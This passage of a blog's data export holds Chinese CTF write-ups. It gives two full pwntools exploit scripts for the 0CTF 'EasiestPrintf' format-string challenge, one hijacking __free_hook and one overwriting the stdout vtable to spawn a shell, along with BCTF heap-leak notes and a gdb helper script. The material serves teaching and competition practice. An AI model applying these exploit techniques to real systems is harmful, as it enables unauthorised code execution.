class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">addr_stdout = <span class=\"number\">0x0804a044</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"symbol\">DEBUG:</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">    p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">    context(log_level = <span class=\"string\">'critical'</span>)</div><div class=\"line\"><span class=\"symbol\">else:</span></div><div class=\"line\">    <span class=\"comment\"># p = remote('202.120.7.210', 12321)</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span></span>:</div><div class=\"line\">    <span class=\"keyword\">return</span> remote(<span class=\"string\">'202.120.7.210'</span>, <span class=\"number\">12321</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_addr</span><span class=\"params\">(addr)</span></span>:</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">    p.sendline(str(addr))</div><div class=\"line\">    addr = p.recvuntil(<span class=\"string\">'\\n'</span>)[<span class=\"symbol\">:-</span><span class=\"number\">1</span>]</div><div class=\"line\">    addr = int(addr, <span class=\"number\">16</span>)</div><div class=\"line\">    print <span class=\"string\">'stdout =&gt;'</span>, hex(addr)</div><div class=\"line\">    <span class=\"keyword\">return</span> addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    stdout_addr = get_addr(addr_stdout)</div><div class=\"line\">    libc.address = stdout_addr - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    stdout_vtable_addr = stdout_addr + <span class=\"number\">0x94</span></div><div class=\"line\">    str_sh = u32(<span class=\"string\">'sh\\x00\\x00'</span>)</div><div class=\"line\">    x1 = system_addr</div><div class=\"line\">    x1_hi, x1_lo = x1 <span class=\"meta\">&gt;&gt; </span><span class=\"number\">16</span>, x1 &amp; <span class=\"number\">0xFFFF</span></div><div class=\"line\">    x2 = stdout_addr - <span class=\"number\">4</span> - <span class=\"number\">0x1c</span></div><div class=\"line\">    x2_hi, x2_lo = x2 <span class=\"meta\">&gt;&gt; </span><span class=\"number\">16</span>, x2 &amp; <span class=\"number\">0xFFFF</span></div><div class=\"line\"> </div><div class=\"line\">    print p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># libc_stdout = 'sh\\x00\\x00'</span></div><div class=\"line\">    <span class=\"comment\"># libc_stdout-4 = &amp;system</span></div><div class=\"line\">    <span class=\"comment\"># libc_stdout_vtable+0x1c = &amp;(libc_stdout-4)</span></div><div class=\"line\">    buf = p32(stdout_addr) + p32(stdout_addr-<span class=\"number\">4</span>) + p32(stdout_addr-<span class=\"number\">2</span>) + p32(stdout_vtable_addr)</div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(str_sh-<span class=\"number\">16</span>) + <span class=\"string\">'c%7$n'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x1_lo-str_sh) + <span class=\"string\">'c%8$hn'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x1_hi-x1_lo) + <span class=\"string\">'c%9$hn'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x2_lo-x1_hi) + <span class=\"string\">'c%10$hn'</span></div><div class=\"line\"></div><div class=\"line\">    p.sendline(buf)</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"EasiestPrintf\"><a href=\"#EasiestPrintf\" class=\"headerlink\" title=\"EasiestPrintf\"></a>EasiestPrintf</h2><p>简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。</p>\n<p>顺便吐吐槽新的<code>pwntools</code>的大升级。</p>\n<h3 id=\"第一个思路\"><a href=\"#第一个思路\" class=\"headerlink\" title=\"第一个思路\"></a>第一个思路</h3><p>我们<code>checksec</code>之后发现<code>got</code>是不能重写的。</p>\n<figure class=\"highlight scheme\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"name\">!</span>] Couldn<span class=\"symbol\">'t</span> find relocations against PLT to get symbols</div><div class=\"line\">[<span class=\"name\"><span class=\"builtin-name\">*</span></span>] <span class=\"symbol\">'/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf</span>'</div><div class=\"line\">    Arch:     i386-32-little</div><div class=\"line\">    RELRO:    Full RELRO</div><div class=\"line\">    Stack:    No canary found</div><div class=\"line\">    NX:       NX enabled</div><div class=\"line\">    PIE:      No PIE (<span class=\"name\">0x8048000</span>)</div></pre></td></tr></table></figure>\n<blockquote>\n<p>Change the value of <code>__malloc_hook</code> or <code>__free_hook</code> and find a way to trigger them in printf.</p>\n</blockquote>\n<p>事实上，在<code>printf</code>函数中，当我们打印的字符串长度过长时，会调用<code>malloc</code>和<code>free</code>的函数。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">vfprintf</span>.<span class=\"function\">c</span></div><div class=\"line\"><span class=\"title\">if</span> <span class=\"params\">(width &gt;= WORK_BUFFER_SIZE - <span class=\"number\">32</span>)</span></div><div class=\"line\">\t  &#123;</div><div class=\"line\">\t    <span class=\"comment\">/* We have to use a special buffer.  The \"32\" is just a safe</span></div><div class=\"line\">\t       bet for all the output which is not counted in the width.  */</div><div class=\"line\">\t    <span class=\"keyword\">size_t</span> needed = ((<span class=\"keyword\">size_t</span>) width + <span class=\"number\">32</span>) * <span class=\"keyword\">sizeof</span> (CHAR_T);</div><div class=\"line\">\t    <span class=\"keyword\">if</span> (__libc_use_alloca (needed))</div><div class=\"line\">\t      workend = (CHAR_T *) alloca (needed) + width + <span class=\"number\">32</span>;</div><div class=\"line\">\t    <span class=\"keyword\">else</span></div><div class=\"line\">\t      &#123;</div><div class=\"line\">\t\tworkstart = (CHAR_T *) <span class=\"built_in\">malloc</span> (needed);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (workstart == <span class=\"literal\">NULL</span>)</div><div class=\"line\">\t\t  &#123;</div><div class=\"line\">\t\t    done = <span class=\"number\">-1</span>;</div><div class=\"line\">\t\t    <span class=\"keyword\">goto</span> all_done;</div><div class=\"line\">\t\t  &#125;</div><div class=\"line\">\t\tworkend = workstart + width + <span class=\"number\">32</span>;</div><div class=\"line\">\t      &#125;</div><div class=\"line\">\t  &#125;</div></pre></td></tr></table></figure>\n<blockquote>\n<ol>\n<li>Leak the libc address from the arbitrary read.</li>\n<li>Construct a format string with<br> the <code>%hhn</code> trick to modify <code>__free_hook</code> to the one-gadget.<br> <code>%100000c</code> to trigger malloc and free.</li>\n</ol>\n<p>I choose <code>__free_hook</code> instead of <code>__malloc_hook</code> because the address of <code>__malloc_hook</code> contains a <code>\\x0a</code> byte which will break the reading of the input.</p>\n</blockquote>\n<ol>\n<li>用格式化字符串修改<code>__free_hook</code>，使其指向一个gadget</li>\n<li>用<code>%100000c</code>去除法<code>malloc</code></li>\n</ol>\n<p><strong>事实上，题目给出的<code>libc</code>的版本是早于<code>libc.2.23.so</code>的，所以存在<code>*0x3E297</code>这样一个<code>execve(&#39;/bin/sh&#39;)</code>，在之后版本的<code>libc</code>中全部都吧<code>/bin/sh</code>给去掉了</strong></p>\n<blockquote>\n<p>在GNU C库中，可以通过指定合适的钩子函数，来修改<code>malloc</code>、<code>relloc</code>、<code>free</code>的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在<code>malloc.h</code>中定义了以下钩子变量：<br><code>__malloc_hook</code><br>该变量是<code>malloc</code>被调用时所使用的函数的指针，类型为<code>void *function (size_t size, const void *caller)</code>，<code>caller</code>的值表示<code>malloc</code>被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。<br><code>__realloc_hook</code><br>与<code>__malloc_hook</code>类似，该变量是realloc被调用时所使用的函数的指针，类型为<code>void *function (void *ptr, size_t size, const void *caller)</code><br><code>__free_hook</code><br>该变量是free被调用时所使用的函数的指针，类型为<code>void function (void *ptr, const void *caller)</code><br><code>__memalign_hook</code><br>该变量是<code>aligned_alloc</code>,<code>memalign</code>, <code>posix_memalign</code>和<code>valloc</code>所使用的函数的指针，类型为<code>void *function (size_t alignment, size_t size, const void *caller)</code><br><code>__malloc_initialize_hook</code><br>该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：<br><code>void (*__malloc_initialize_hook) (void) = my_init_hook;</code></p>\n<p>这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入<code>malloc/realloc/free</code>调试函数的一个可行的方式是采用自己的库来<code>export</code>这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用<code>LD_PRELOAD</code>机制在加载时注入自己的<code>malloc</code>函数。 </p>\n</blockquote>\n<p>最终的exp<br><figure class=\"highlight processing\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">context.log_level = <span class=\"string\">'critical'</span></div><div class=\"line\"></div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">read_got = elf.symbols[<span class=\"string\">'_GLOBAL_OFFSET_TABLE_'</span>] + <span class=\"number\">12</span></div><div class=\"line\">libc.symbols[<span class=\"string\">'one_gadget'</span>] = <span class=\"number\">0x3E297</span></div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">def exec_fmt(payload):</div><div class=\"line\">    p = elf.process(env = &#123;<span class=\"string\">'LD_PRELOAD'</span>: libc.path&#125;)</div><div class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(read_got))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">return</span> p.recvall()</div><div class=\"line\"></div><div class=\"line\">fmt = FmtStr(exec_fmt)</div><div class=\"line\"><span class=\"built_in\">log</span>.critical(<span class=\"string\">'offset: '</span> + <span class=\"built_in\">str</span>(fmt.offset))</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"><span class=\"built_in\">print</span> p.recvline()</div><div class=\"line\"></div><div class=\"line\">p.sendline(<span class=\"built_in\">str</span>(read_got))</div><div class=\"line\">data = p.recvline()</div><div class=\"line\"><span class=\"built_in\">print</span> data</div><div class=\"line\">read_addr = <span class=\"built_in\">int</span>(data, <span class=\"number\">16</span>)</div><div class=\"line\">libc.address = read_addr - libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\"><span class=\"built_in\">log</span>.critical(<span class=\"string\">'libc_base : '</span>, <span class=\"built_in\">hex</span>(libc.address))</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">print</span> p.recvline()</div><div class=\"line\">p.sendline(fmtstr_payload(fmt.offset, &#123;libc.symbols[<span class=\"string\">'__free_hook'</span>]: libc.symbols[<span class=\"string\">'one_gadget'</span>]&#125;) + <span class=\"string\">'%100000c'</span>)</div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h3 id=\"第二个思路\"><a href=\"#第二个思路\" class=\"headerlink\" title=\"第二个思路\"></a>第二个思路</h3><blockquote>\n<p>程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接<code>exi</code>t。在程序启用<code>Full RELRO</code>的情况下，选择覆盖<code>libc</code>中的<code>_IO_2_1_stdout_</code>结构的虚表，因为<code>printf</code>在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为<code>system</code>，而这个结构自身会作为参数传入，覆盖虚表之后将一个<code>sh\\0\\0</code>写到整个结构头部即可。</p>\n</blockquote>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\"></div><div class=\"line\">addr_stdout = <span class=\"number\">0x0804a044</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"symbol\">DEBUG:</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</div><div class=\"line\">    p = process(<span class=\"string\">'./EasiestPrintf'</span>)</div><div class=\"line\">    context(log_level = <span class=\"string\">'critical'</span>)</div><div class=\"line\"><span class=\"symbol\">else:</span></div><div class=\"line\">    <span class=\"comment\"># p = remote('202.120.7.210', 12321)</span></div><div class=\"line\">    libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span></span>:</div><div class=\"line\">    <span class=\"keyword\">return</span> remote(<span class=\"string\">'202.120.7.210'</span>, <span class=\"number\">12321</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_addr</span><span class=\"params\">(addr)</span></span>:</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'read:\\n'</span>)</div><div class=\"line\">    p.sendline(str(addr))</div><div class=\"line\">    addr = p.recvuntil(<span class=\"string\">'\\n'</span>)[<span class=\"symbol\">:-</span><span class=\"number\">1</span>]</div><div class=\"line\">    addr = int(addr, <span class=\"number\">16</span>)</div><div class=\"line\">    print <span class=\"string\">'stdout =&gt;'</span>, hex(addr)</div><div class=\"line\">    <span class=\"keyword\">return</span> addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    stdout_addr = get_addr(addr_stdout)</div><div class=\"line\">    libc.address = stdout_addr - libc.symbols[<span class=\"string\">'_IO_2_1_stdout_'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    stdout_vtable_addr = stdout_addr + <span class=\"number\">0x94</span></div><div class=\"line\">    str_sh = u32(<span class=\"string\">'sh\\x00\\x00'</span>)</div><div class=\"line\">    x1 = system_addr</div><div class=\"line\">    x1_hi, x1_lo = x1 <span class=\"meta\">&gt;&gt; </span><span class=\"number\">16</span>, x1 &amp; <span class=\"number\">0xFFFF</span></div><div class=\"line\">    x2 = stdout_addr - <span class=\"number\">4</span> - <span class=\"number\">0x1c</span></div><div class=\"line\">    x2_hi, x2_lo = x2 <span class=\"meta\">&gt;&gt; </span><span class=\"number\">16</span>, x2 &amp; <span class=\"number\">0xFFFF</span></div><div class=\"line\"> </div><div class=\"line\">    print p.recvuntil(<span class=\"string\">'Good Bye\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># libc_stdout = 'sh\\x00\\x00'</span></div><div class=\"line\">    <span class=\"comment\"># libc_stdout-4 = &amp;system</span></div><div class=\"line\">    <span class=\"comment\"># libc_stdout_vtable+0x1c = &amp;(libc_stdout-4)</span></div><div class=\"line\">    buf = p32(stdout_addr) + p32(stdout_addr-<span class=\"number\">4</span>) + p32(stdout_addr-<span class=\"number\">2</span>) + p32(stdout_vtable_addr)</div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(str_sh-<span class=\"number\">16</span>) + <span class=\"string\">'c%7$n'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x1_lo-str_sh) + <span class=\"string\">'c%8$hn'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x1_hi-x1_lo) + <span class=\"string\">'c%9$hn'</span></div><div class=\"line\">    buf += <span class=\"string\">'%'</span> + str(<span class=\"number\">0x10000</span>+x2_lo-x1_hi) + <span class=\"string\">'c%10$hn'</span></div><div class=\"line\"></div><div class=\"line\">    p.sendline(buf)</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>"},{"title":"2017BCTF & pwndbg & ida","date":"2017-04-22T13:07:06.000Z","_content":"\n## 工具\n\npwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。\n\n今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。\n\npwndbg的README说的很详细了，不在赘述。\n\n## babyuse\n\n看了看别人的wp，总结了几种利用方法。\n1. leak都用UAF\n2. malloc一个大内存(>128)，会存在unsortbins中，可以leak出main_arena，计算出libc\n3. 利用fastbin的链表结构，leak出heap_base\n4. Nu1L用末尾添加\\x00的方法，修改指针最后一位\\x00使其指向vtable，leak出pie的地址\n5. shell一般都用one_gadget，Nu1L的`_init_arry`没看懂。\n\n为了方便调试，关闭ASLR，并且简单写了个gdb脚本。\n\n```\n# import glibc\n# directory ~/desktop/glibc-2.24/malloc/\n\n#######################################################\n# context config\nset ida-rpc-host 192.168.234.1\n\n######################################################\n# ignore SIGALRM\n# handle SIGALRM ignore\n\n#######################################################\ndefine p32break\n\tbreak * 0x56555000 + $arg0\nend\n\ndocument p32break\n\tbreak when PIE is on\nend\n\n########################################################\ndefine p32telescope\n\ttelescope 0x56555000+$arg0 $arg1\nend\n\ndocument p32telescope\n\ttelescope when PIE is on\nend\n\n#######################################################\nsource aa\ndefine ssa\n    session save aa\nend\n```\n\n## 100levels","source":"_posts/2017BCTF-pwndbg-ida.md","raw":"---\ntitle: 2017BCTF & pwndbg & ida\ntags:\n  - PWN\n  - pwndbg\n  - ida\ncategories: []\ndate: 2017-04-22 21:07:06\n---\n\n## 工具\n\npwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。\n\n今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。\n\npwndbg的README说的很详细了，不在赘述。\n\n## babyuse\n\n看了看别人的wp，总结了几种利用方法。\n1. leak都用UAF\n2. malloc一个大内存(>128)，会存在unsortbins中，可以leak出main_arena，计算出libc\n3. 利用fastbin的链表结构，leak出heap_base\n4. Nu1L用末尾添加\\x00的方法，修改指针最后一位\\x00使其指向vtable，leak出pie的地址\n5. shell一般都用one_gadget，Nu1L的`_init_arry`没看懂。\n\n为了方便调试，关闭ASLR，并且简单写了个gdb脚本。\n\n```\n# import glibc\n# directory ~/desktop/glibc-2.24/malloc/\n\n#######################################################\n# context config\nset ida-rpc-host 192.168.234.1\n\n######################################################\n# ignore SIGALRM\n# handle SIGALRM ignore\n\n#######################################################\ndefine p32break\n\tbreak * 0x56555000 + $arg0\nend\n\ndocument p32break\n\tbreak when PIE is on\nend\n\n########################################################\ndefine p32telescope\n\ttelescope 0x56555000+$arg0 $arg1\nend\n\ndocument p32telescope\n\ttelescope when PIE is on\nend\n\n#######################################################\nsource aa\ndefine ssa\n    session save aa\nend\n```\n\n## 100levels","slug":"2017BCTF-pwndbg-ida","published":1,"updated":"2017-04-22T13:07:31.214Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jx10005hv18wb272tqq","content":"<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><p>pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。</p>\n<p>今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。</p>\n<p>pwndbg的README说的很详细了，不在赘述。</p>\n<h2 id=\"babyuse\"><a href=\"#babyuse\" class=\"headerlink\" title=\"babyuse\"></a>babyuse</h2><p>看了看别人的wp，总结了几种利用方法。</p>\n<ol>\n<li>leak都用UAF</li>\n<li>malloc一个大内存(&gt;128)，会存在unsortbins中，可以leak出main_arena，计算出libc</li>\n<li>利用fastbin的链表结构，leak出heap_base</li>\n<li>Nu1L用末尾添加\\x00的方法，修改指针最后一位\\x00使其指向vtable，leak出pie的地址</li>\n<li>shell一般都用one_gadget，Nu1L的<code>_init_arry</code>没看懂。</li>\n</ol>\n<p>为了方便调试，关闭ASLR，并且简单写了个gdb脚本。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"># <span class=\"keyword\">import</span> glibc</div><div class=\"line\"># directory ~/desktop/glibc<span class=\"number\">-2.24</span>/malloc/</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\"># context config</div><div class=\"line\">set ida-rpc-host <span class=\"number\">192.168</span><span class=\"number\">.234</span><span class=\"number\">.1</span></div><div class=\"line\"></div><div class=\"line\">######################################################</div><div class=\"line\"># ignore SIGALRM</div><div class=\"line\"># handle SIGALRM ignore</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\">define p32break</div><div class=\"line\">\tbreak * <span class=\"number\">0x56555000</span> + $arg0</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">document p32break</div><div class=\"line\">\tbreak when PIE is on</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">########################################################</div><div class=\"line\">define p32telescope</div><div class=\"line\">\ttelescope <span class=\"number\">0x56555000</span>+$arg0 $arg1</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">document p32telescope</div><div class=\"line\">\ttelescope when PIE is on</div><div class=\"line\">end</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\">source aa</div><div class=\"line\">define ssa</div><div class=\"line\">    session save aa</div><div class=\"line\">end</div></pre></td></tr></table></figure>\n<h2 id=\"100levels\"><a href=\"#100levels\" class=\"headerlink\" title=\"100levels\"></a>100levels</h2>","excerpt":"","more":"<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><p>pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。</p>\n<p>今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。</p>\n<p>pwndbg的README说的很详细了，不在赘述。</p>\n<h2 id=\"babyuse\"><a href=\"#babyuse\" class=\"headerlink\" title=\"babyuse\"></a>babyuse</h2><p>看了看别人的wp，总结了几种利用方法。</p>\n<ol>\n<li>leak都用UAF</li>\n<li>malloc一个大内存(&gt;128)，会存在unsortbins中，可以leak出main_arena，计算出libc</li>\n<li>利用fastbin的链表结构，leak出heap_base</li>\n<li>Nu1L用末尾添加\\x00的方法，修改指针最后一位\\x00使其指向vtable，leak出pie的地址</li>\n<li>shell一般都用one_gadget，Nu1L的<code>_init_arry</code>没看懂。</li>\n</ol>\n<p>为了方便调试，关闭ASLR，并且简单写了个gdb脚本。</p>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"># <span class=\"keyword\">import</span> glibc</div><div class=\"line\"># directory ~/desktop/glibc<span class=\"number\">-2.24</span>/malloc/</div><div class=\"line\"></div><div class=\"line\">#######################################################</div><div class=\"line\"># context config</div><div class=\"line\">set ida-rpc-host <span 